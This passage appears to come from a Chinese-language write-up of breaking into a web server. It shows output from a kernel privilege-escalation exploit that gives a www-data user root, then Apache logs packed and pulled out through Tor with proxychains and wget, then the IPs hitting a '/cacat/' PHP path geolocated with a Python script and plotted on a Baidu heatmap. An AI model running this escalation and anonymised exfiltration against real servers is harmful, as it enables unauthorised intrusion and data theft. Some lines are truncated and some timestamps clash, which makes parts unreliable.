    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@medidor2:/tmp$ ./hello
    [*] range: b7573000-b7716000]
    [*] getuid = b762bd10
    [*] mmap 0xb73cb000
    [*] exploiting (patch)
    [*] patched (madviseThread)
    [*] patched (procselfmemThread)
    root@medidor2:/tmp# [*] exploiting (unpatch)
    [*] unpatched: uid=33 (madviseThread)
    [*] unpatched: uid=33 (procselfmemThread)
    root@medidor2:/tmp# id
    uid=0(root) gid=0(root) groups=0(root)
打包Apache日志。
    ? ? root@kali  ls /var/log/apache2
    access  error  other_vhosts_access.log
    ? ? root@kali  tar zcvf /var/www/apache2-log.tar.gz  /var/log/apache2/
    ? ? root@kali  /tmp  ltor wget http://187.85.134.4/apache2-log.tar.gz  
    [proxychains] config file found: /data/app/local/proxychains_local_tor/proxychains.conf
    [proxychains] preloading /data/app/local/proxychains_local_tor/libproxychains4.so
    [proxychains] DLL init
    --2011-11-11 11:11:11--  http://187.85.134.4/apache2-log.tar.gz
    正在连接 187.85.134.4:80... [proxychains] Strict chain  ...  127.0.0.1:9050  ...  187.85.134.4:80  ...  OK
    已连接。
    已发出 HTTP 请求，正在等待回应... 200 OK
    长度：9258688 (8.8M) [application/x-gzip]
    正在保存至: “apache2-log.tar.gz”
    apache2-log.tar.gz  100%[===================>]   8.83M  29.6KB/s  用时 5m 45s  
    2018-11-11 11:11:11 (26.2 KB/s) - 已保存 “apache2-log.tar.gz” [9258688/9258688])
### **5.5 分析日志**
分析IP访问情况
    ? root@kali  /tmp/  grep "/cacat/" * |grep "php" | awk -F ":" '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]" "i;}}' |sort -t " " -k 1 -n -r >ip.txt
    95 185.56.80.138
    77 197.211.60.52
    70 67.71.3.8
    59 207.35.210.35
    41 99.226.207.46
    41 193.215.40.238
    39 197.211.59.163
    38 82.61.95.132
    38 66.249.73.95
    37 76.26.34.181
    37 197.234.221.77
    31 105.112.27.60
    29 105.112.23.41
    20 109.166.138.68
    16 66.249.79.61
    16 197.211.61.18
    14 212.100.77.191
    12 197.234.221.210
    8 66.249.79.35
    8 66.249.73.64
    7 154.118.69.165
    5 66.249.73.67
    ......
     ? root@kali  /tmp  for line in $(ip.txt
     ? root@kali  ~/Desktop  wc -l ip.txt                                                        
    10101 ip.txt
### **5.6 访问IP热力图**
#### **5.6.1 IP转经纬度坐标**
将获得的IP转换成经纬度坐标，再通过百度地图API生成热力图
> 将IP转换成经纬度坐标，脚本：`ip2xy.py` 生成经纬度坐标文件：`point.js` 全球IP库：`GeoLiteCity.dat`
    #!/usr/bin/python
    #coding:utf-8
    import pandas as pd
    import pygeoip
    import types
    import sys
    gi = pygeoip.GeoIP('/tmp/GeoLiteCity.dat', pygeoip.MEMORY_CACHE)
    def getLocal(ip):
        if type(ip) != types.StringType:
            print ip
            return
        location = gi.record_by_addr(ip)
        if location is None:
            print ip
            return
        lng = location['longitude']
        lat = location['latitude']
        str_temp = '{"lat":' + str(lat) + ',"lng":' + str(lng) + '},\n'
        print ip,lng,lat,str_temp
        file.write(str_temp)
    file = open('/tmp/point.js', 'w')
    file.write("var points =[\n")
    with open("/tmp/ip.txt") as f:
        i = 0
        for ip in  f.readlines():
            getLocal(ip)
    file.write("];\n")
    file.close()
#### **5.6.2 调用百度地图API**
本地调用百度地图 JavaScript API： map.html
        热力图功能示例
        var map = new BMap.Map("container");          // 创建地图实例
        var point = new BMap.Point(34.0224714118,109.0786868715);
        map.centerAndZoom(point, 6);             // 初始化地图，设置中心点坐标和地图级别
        map.setCurrentCity("西安");       //设置当前显示城市
        map.enableScrollWheelZoom(); // 允许滚轮缩放
        if(!isSupportCanvas()){
            alert('热力图目前只支持有canvas支持的浏览器,您所使用的浏览器不能使用热力图功能~')
        }